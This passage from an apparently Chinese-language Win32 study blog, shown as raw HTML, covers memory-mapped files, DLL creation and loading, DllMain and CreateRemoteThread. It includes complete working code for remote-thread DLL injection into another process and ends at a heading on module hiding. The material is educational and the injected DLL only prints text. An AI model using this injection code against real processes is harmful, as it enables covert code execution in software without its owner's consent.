LPCTSTR lpName          // object name 对象名称</span></span><br><span class="line"><span class="comment">    );</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    hMapFile = <span class="built_in">OpenFileMapping</span>(FILE_MAP_ALL_ACCESS, FALSE, MAPPINGNAME);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 2. 物理页映射到虚拟内存</span></span><br><span class="line">    lpAddr = <span class="built_in">MapViewOfFile</span>(hMapFile, FILE_MAP_ALL_ACCESS, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 3. 读取文件</span></span><br><span class="line">    DWORD dwTest1 = *(LPDWORD)lpAddr; <span class="comment">// 读取最开始的4字节</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;dwTest1: %x \n&quot;</span>, dwTest1);</span><br><span class="line">    <span class="comment">// 4. 写文件</span></span><br><span class="line">    <span class="comment">// *(LPDWORD)lpAddr = 0x41414142;</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Process B Read&quot;</span>);</span><br><span class="line">    <span class="built_in">getchar</span>();</span><br><span class="line">    <span class="comment">// 5. 关闭资源</span></span><br><span class="line">    <span class="built_in">UnmapViewOfFile</span>(lpAddr);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hMapFile);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="内存映射文件之写拷贝"><a href="#内存映射文件之写拷贝" class="headerlink" title="内存映射文件之写拷贝"></a>内存映射文件之写拷贝</h2><p>实际上我们程序调用的user32.dll这类dll文件，也是通过这种方式进行调用的，如果我们进程A修改了某个DLL，就会导致进程B出问题。</p><p>为了解决这种隐患，我们可以使用写拷贝的方式来处理。</p><p>写拷贝的实现就是<strong>MapViewOfFile函数</strong>中的第二个参数值为<strong>FILE_MAP_COPY</strong>，<strong>它的意思表示当你在写的时候进行拷贝</strong>。写拷贝属性时候，写入时并<strong>不会影响</strong>原本的文件内容</p><p><img src="/2022/04/01/%E9%87%8D%E6%8B%BEWin32/image-20220404235855922.png" alt="image-20220404235855922"></p><h1 id="静态链接库"><a href="#静态链接库" class="headerlink" title="静态链接库"></a>静态链接库</h1><p>动态链接和静态链接之前pwn的时候搞过，就不写的太详细了。</p><p>写好之后，将生成的.h文件和.lib文件放到项目的根目录，然后引用：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;xxxx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib, <span class="meta-string">&quot;xxxx.lib&quot;</span>)</span></span><br></pre></td></tr></table></figure><h1 id="动态链接库"><a href="#动态链接库" class="headerlink" title="动态链接库"></a>动态链接库</h1><p>使用的是VS2022,，创建动态链接库项目，把其他的文件删掉，新建MyDLL的h和cpp文件，不使用预编译头。</p><p><img src="/2022/04/01/%E9%87%8D%E6%8B%BEWin32/image-20220405004843503.png" alt="image-20220405004843503"></p><p>.h:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> __declspec(dllexport)  <span class="function"><span class="keyword">int</span> <span class="title">ADD</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> __declspec(dllexport)  <span class="function"><span class="keyword">int</span> <span class="title">SUB</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span>;</span><br></pre></td></tr></table></figure><p>.cpp:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ADD</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">SUB</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> a - b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>生成：</p><p><img src="/2022/04/01/%E9%87%8D%E6%8B%BEWin32/image-20220405005507193.png" alt="image-20220405005507193"></p><p>使用：</p><p>生成的dll，将dll，lib和h文件放到使用dll的项目中，vcxproj同级。</p><p>之后分别右键导入h和lib、dll，直接使用就可：</p><p><img src="/2022/04/01/%E9%87%8D%E6%8B%BEWin32/image-20220405013109265.png" alt="image-20220405013109265"></p><p>还可以这样使用：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 将DLL文件复制到项目目录下</span></span><br><span class="line"></span><br><span class="line">   <span class="comment">// 步骤1：定义函数指针,如：</span></span><br><span class="line">   <span class="function"><span class="keyword">typedef</span> <span class="title">int</span> <span class="params">(*lpAdd)</span><span class="params">(<span class="keyword">int</span>, <span class="keyword">int</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">   <span class="comment">// 步骤2：声明函数指针变量,如：</span></span><br><span class="line">   lpAdd myAdd;</span><br><span class="line"></span><br><span class="line">   <span class="comment">// 步骤3：动态加载dll到内存中,如：</span></span><br><span class="line">   <span class="comment">// LoadLibrary函数会先从当前目录寻找，然后在系统目录寻找</span></span><br><span class="line">   HINSTANCE hModule = <span class="built_in">LoadLibrary</span>(<span class="built_in">TEXT</span>(<span class="string">&quot;MyDLL.dll&quot;</span>));</span><br><span class="line"></span><br><span class="line">   <span class="comment">// 步骤4：获取函数地址,如：</span></span><br><span class="line">   myAdd = (lpAdd)<span class="built_in">GetProcAddress</span>(hModule, <span class="string">&quot;ADD&quot;</span>);</span><br><span class="line"></span><br><span class="line">   <span class="comment">// 步骤5：调用函数,如：</span></span><br><span class="line">   <span class="keyword">int</span> a = <span class="built_in">myAdd</span>(<span class="number">10</span>, <span class="number">2</span>);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, a);</span><br><span class="line"></span><br><span class="line">   <span class="comment">// 步骤6：释放动态链接库,如：</span></span><br><span class="line">   <span class="built_in">FreeLibrary</span>(hModule);</span><br></pre></td></tr></table></figure><p><img src="/2022/04/01/%E9%87%8D%E6%8B%BEWin32/image-20220405111423572.png" alt="image-20220405111423572"></p><h1 id="隐式链接"><a href="#隐式链接" class="headerlink" title="隐式链接"></a>隐式链接</h1><p>将动态链接生成的lib和dll文件放到项目目录 ，</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib, <span class="meta-string">&quot;MyDLL.lib&quot;</span>)</span></span><br><span class="line">__declspec(dllimport) <span class="function"><span class="keyword">int</span> <span class="title">ADD</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span>;</span><br><span class="line">__declspec(dllimport) <span class="function"><span class="keyword">int</span> <span class="title">SUB</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a = <span class="built_in">SUB</span>(<span class="number">2</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">int</span> b = <span class="built_in">ADD</span>(<span class="number">23</span>, <span class="number">11</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="DLLMain"><a href="#DLLMain" class="headerlink" title="DLLMain"></a>DLLMain</h2><p>dll的入口函数是DLLMain，DLLMain可能执行很多次</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL WINAPI <span class="title">DllMain</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  HINSTANCE hinstDLL,   <span class="comment">// handle to the DLL module DLL模块的句柄，当前DLL被加载到什么位置</span></span></span></span><br><span class="line"><span class="params"><span class="function">  DWORD fdwReason,      <span class="comment">// reason for calling function DLL被调用的原因，有4种情况：DLL_PROCESS_ATTACH（当某个进程第一次执行LoadLibrary）、DLL_PROCESS_DETACH（当某个进程释放了DLL）、DLL_THREAD_ATTACH（当某个进程的其他线程再次执行LoadLibrary）、DLL_THREAD_DETACH（当某个进程的其他线程释放了DLL）</span></span></span></span><br><span class="line"><span class="params"><span class="function">  LPVOID lpvReserved    <span class="comment">// reserved</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><h1 id="远程线程"><a href="#远程线程" class="headerlink" title="远程线程"></a>远程线程</h1><h2 id="CreateRemoteThread"><a href="#CreateRemoteThread" class="headerlink" title="CreateRemoteThread"></a>CreateRemoteThread</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HANDLE <span class="title">CreateRemoteThread</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  HANDLE hProcess,                          <span class="comment">// handle to process 输入类型，进程句柄</span></span></span></span><br><span class="line"><span class="params"><span class="function">  LPSECURITY_ATTRIBUTES lpThreadAttributes, <span class="comment">// SD 输入类型，安全属性，包含安全描述符</span></span></span></span><br><span class="line"><span class="params"><span class="function">  SIZE_T dwStackSize,                       <span class="comment">// initial stack size 输入类型，堆大小</span></span></span></span><br><span class="line"><span class="params"><span class="function">  LPTHREAD_START_ROUTINE lpStartAddress,    <span class="comment">// thread function 输入类型，线程函数，线程函数地址应该是在别的进程中存在的</span></span></span></span><br><span class="line"><span class="params"><span class="function">  LPVOID lpParameter,                       <span class="comment">// thread argument　输入类型，线程参数</span></span></span></span><br><span class="line"><span class="params"><span class="function">  DWORD dwCreationFlags,                    <span class="comment">// creation option 输入类型，创建设置</span></span></span></span><br><span class="line"><span class="params"><span class="function">  LPDWORD lpThreadId                        <span class="comment">// thread identifier 输出类型，线程id</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><p><strong>CreateThread</strong>函数是在当前进程中创建线程，而<strong>CreateRemoteThread</strong>函数是允许在其他进程中创建线程，所以<strong>远程线程就可以理解为是非本进程中的线程</strong>。</p><p>A进程简单的输出10句话，之后使用B进程创建远程进程</p><p>A:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Fun</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">5</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Fun running... \n&quot;</span>);</span><br><span class="line">        <span class="built_in">Sleep</span>(<span class="number">1000</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadProc</span><span class="params">(LPVOID lpParameter)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">Fun</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">    HANDLE hThread = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="literal">NULL</span>, ThreadProc, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">getchar</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>B:执行的远程线程的线程函数地址应该是在别的进程中存在的</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">MyCreateRemoteThread</span><span class="params">(DWORD dwProcessId, DWORD dwProcessAddr)</span> </span>&#123;</span><br><span class="line">    DWORD dwThreadId;</span><br><span class="line">    HANDLE hProcess;</span><br><span class="line">    HANDLE hThread;</span><br><span class="line">    <span class="comment">// 1. 获取进程句柄</span></span><br><span class="line">    hProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, dwProcessId);</span><br><span class="line">    <span class="comment">// 判断OpenProcess是否执行成功</span></span><br><span class="line">    <span class="keyword">if</span> (hProcess == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">OutputDebugString</span>(<span class="built_in">TEXT</span>(<span class="string">&quot;OpenProcess failed! \n&quot;</span>));</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 2. 创建远程线程</span></span><br><span class="line">    hThread = <span class="built_in">CreateRemoteThread</span>(</span><br><span class="line">        hProcess,                          <span class="comment">// handle to process</span></span><br><span class="line">        <span class="literal">NULL</span>, <span class="comment">// SD</span></span><br><span class="line">        <span class="number">0</span>,                       <span class="comment">// initial stack size</span></span><br><span class="line">        (LPTHREAD_START_ROUTINE)dwProcessAddr,    <span class="comment">// thread function</span></span><br><span class="line">        <span class="literal">NULL</span>,                       <span class="comment">// thread argument</span></span><br><span class="line">        <span class="number">0</span>,                    <span class="comment">// creation option</span></span><br><span class="line">        &amp;dwThreadId                        <span class="comment">// thread identifier</span></span><br><span class="line">    );</span><br><span class="line">    <span class="comment">// 判断CreateRemoteThread是否执行成功</span></span><br><span class="line">    <span class="keyword">if</span> (hThread == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">OutputDebugString</span>(<span class="built_in">TEXT</span>(<span class="string">&quot;CreateRemoteThread failed! \n&quot;</span>));</span><br><span class="line">        <span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. 关闭</span></span><br><span class="line">    <span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 返回</span></span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>成功执行！</p><p><img src="/2022/04/01/%E9%87%8D%E6%8B%BEWin32/image-20220405121345946.png" alt="image-20220405121345946"></p><h1 id="远程线程注入"><a href="#远程线程注入" class="headerlink" title="远程线程注入"></a>远程线程注入</h1><p>如果我们想要创建远程线程调用自己定义的线程函数就需要使用<strong>远程线程注入</strong>技术。</p><h2 id="什么是注入"><a href="#什么是注入" class="headerlink" title="什么是注入"></a>什么是注入</h2><p>所谓注入就是在第三方进程不知道或者不允许的情况下将模块或者代码写入对方进程空间，并设法执行的技术。</p><p>在安全领域，“注入”是非常重要的一种技术手段，注入与反注入也一直处于不断变化的，而且也愈来愈激烈的对抗当中。</p><p><strong>已知的注入方式：</strong></p><p>远程线程注入、APC注入、消息钩子注入、注册表注入、导入表注入、输入法注入等等。</p><h2 id="远程线程注入的流程"><a href="#远程线程注入的流程" class="headerlink" title="远程线程注入的流程"></a>远程线程注入的流程</h2><p>远程线程注入的思路就是在进程A中创建线程，<strong>将线程函数指向LoadLibrary函数</strong>。</p><p>那么为什么可以这样呢？这是因为我们执行远程线程函数满足返回值是4字节，一个参数是4字节即可（ThreadProc就是这样的条件）：</p><p>重新写个dll：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadProc</span><span class="params">(LPVOID lpParaneter)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++) &#123;</span><br><span class="line">        <span class="built_in">Sleep</span>(<span class="number">1000</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;DLL RUNNING...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">(HANDLE hModule,</span></span></span><br><span class="line"><span class="params"><span class="function">    DWORD  ul_reason_for_call,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPVOID lpReserved</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;   <span class="comment">// 当进程执行LoadLibrary时创建一个线程，执行ThreadProc线程</span></span><br><span class="line">    <span class="built_in"><span class="keyword">switch</span></span> (ul_reason_for_call) &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">        <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, ThreadProc, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>被注入的程序还是和之前那个一样，下面是注入的程序：（这里我搞了半天，最后还是32位的成功了。。。）</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// LoadDll需要两个参数一个参数是进程ID，一个是DLL文件的路径</span></span><br><span class="line"><span class="function">BOOL <span class="title">LoadDll</span><span class="params">(DWORD dwProcessID, <span class="keyword">char</span>* szDllPathName)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    BOOL bRet;</span><br><span class="line">    HANDLE hProcess;</span><br><span class="line">    HANDLE hThread;</span><br><span class="line">    DWORD dwLength;</span><br><span class="line">    DWORD dwLoadAddr;</span><br><span class="line">    LPVOID lpAllocAddr;</span><br><span class="line">    DWORD dwThreadID;</span><br><span class="line">    HMODULE hModule;</span><br><span class="line"></span><br><span class="line">    bRet = <span class="number">0</span>;</span><br><span class="line">    dwLoadAddr = <span class="number">0</span>;</span><br><span class="line">    hProcess = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1. 获取进程句柄</span></span><br><span class="line">    hProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, dwProcessID);</span><br><span class="line">    <span class="keyword">if</span> (hProcess == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">OutputDebugString</span>(<span class="built_in">TEXT</span>(<span class="string">&quot;OpenProcess failed! \n&quot;</span>));</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. 获取DLL文件路径的长度，并在最后+1，因为要加上0结尾的长度</span></span><br><span class="line">    dwLength = <span class="built_in">strlen</span>(szDllPathName) + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. 在目标进程分配内存</span></span><br><span class="line">    lpAllocAddr = <span class="built_in">VirtualAllocEx</span>(hProcess, <span class="literal">NULL</span>, dwLength, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line">    <span class="keyword">if</span> (lpAllocAddr == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">OutputDebugString</span>(<span class="built_in">TEXT</span>(<span class="string">&quot;VirtualAllocEx failed! \n&quot;</span>));</span><br><span class="line">        <span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4. 拷贝DLL路径名字到目标进程的内存</span></span><br><span class="line">    bRet = <span class="built_in">WriteProcessMemory</span>(hProcess, lpAllocAddr, szDllPathName, dwLength, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (!bRet) &#123;</span><br><span class="line">        <span class="built_in">OutputDebugString</span>(<span class="built_in">TEXT</span>(<span class="string">&quot;WriteProcessMemory failed! \n&quot;</span>));</span><br><span class="line">        <span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 5. 获取模块句柄</span></span><br><span class="line">    <span class="comment">// LoadLibrary这个函数是在kernel32.dll这个模块中的，所以需要现货区kernel32.dll这个模块的句柄</span></span><br><span class="line">    hModule = <span class="built_in">GetModuleHandle</span>(<span class="built_in">TEXT</span>(<span class="string">&quot;kernel32.dll&quot;</span>));</span><br><span class="line">    <span class="keyword">if</span> (!hModule) &#123;</span><br><span class="line">        <span class="built_in">OutputDebugString</span>(<span class="built_in">TEXT</span>(<span class="string">&quot;GetModuleHandle failed! \n&quot;</span>));</span><br><span class="line">        <span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 6. 获取LoadLibraryA函数地址</span></span><br><span class="line">    dwLoadAddr = (DWORD)<span class="built_in">GetProcAddress</span>(hModule, <span class="string">&quot;LoadLibraryA&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!dwLoadAddr) &#123;</span><br><span class="line">        <span class="built_in">OutputDebugString</span>(<span class="built_in">TEXT</span>(<span class="string">&quot;GetProcAddress failed! \n&quot;</span>));</span><br><span class="line">        <span class="built_in">CloseHandle</span>(hModule);</span><br><span class="line">        <span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 7. 创建远程线程，加载DLL</span></span><br><span class="line">    hThread = <span class="built_in">CreateRemoteThread</span>(hProcess, <span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)dwLoadAddr, lpAllocAddr, <span class="number">0</span>, &amp;dwThreadID);</span><br><span class="line">    <span class="keyword">if</span> (!hThread) &#123;</span><br><span class="line">        <span class="built_in">OutputDebugString</span>(<span class="built_in">TEXT</span>(<span class="string">&quot;CreateRemoteThread failed! \n&quot;</span>));</span><br><span class="line">        <span class="built_in">CloseHandle</span>(hModule);</span><br><span class="line">        <span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 8. 关闭进程句柄</span></span><br><span class="line">    <span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">LoadDll</span>(<span class="number">27220</span>, (<span class="keyword">char</span>*)<span class="string">&quot;E:\\github\\Win32LearnCode\\Code\\lesson28\\MyDLL\\Debug\\MyDLL.dll&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>成功注入！！！</p><p><img src="/2022/04/01/%E9%87%8D%E6%8B%BEWin32/image-20220405181829457.png" alt="image-20220405181829457"></p><h1 id="模块隐藏"><a href="#模块隐藏" class="headerlink" title="模块隐藏"></a>模块隐藏</h1><h2 id="模块隐藏-断链"><a href="#模块隐藏-断链" class="headerlink" 